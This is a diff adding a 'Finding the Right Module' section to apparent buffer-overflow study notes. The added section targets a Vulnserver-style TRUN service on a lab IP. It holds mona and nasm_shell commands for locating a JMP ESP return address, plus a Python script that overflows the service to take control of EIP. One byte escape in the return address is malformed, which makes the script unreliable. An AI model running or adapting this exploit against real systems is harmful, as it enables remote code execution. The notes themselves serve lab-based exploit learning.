@@ -185,6 +185,43 @@ https://github.com/cytopia/badchars
 
 -- Finding the Right Module --
 
+Look for all False Values !!!
+!mona modules
+
+
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb            
+nasm > JMP ESP
+00000000  FFE4              jmp esp
+nasm >
+
+
+Look for the return address !!!
+!mona find -s "\xff\xe4" -m esssfunc.dll
+
+
+#right_module.py
+
+#!/usr/bin/python
+import sys, socket
+
+shellcode = "A" * 2003 + "xaf\x11\x50\x62" #little indian
+
+try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.90',9999))        
+        s.send(('TRUN /.:/' + shellcode))
+        s.close()
+except:
+        print "Error connecting to server"
+        sys.exit()
+
+
+Im Immunity Debugger set a BreakPoint (F2)
+Start Immunity Debbuger and execute the python script !!! The EIP is under Control !!!
+
+
+https://github.com/corelan/mona/blob/master/mona.py
+
 
 
 -- Generating Shellcode --
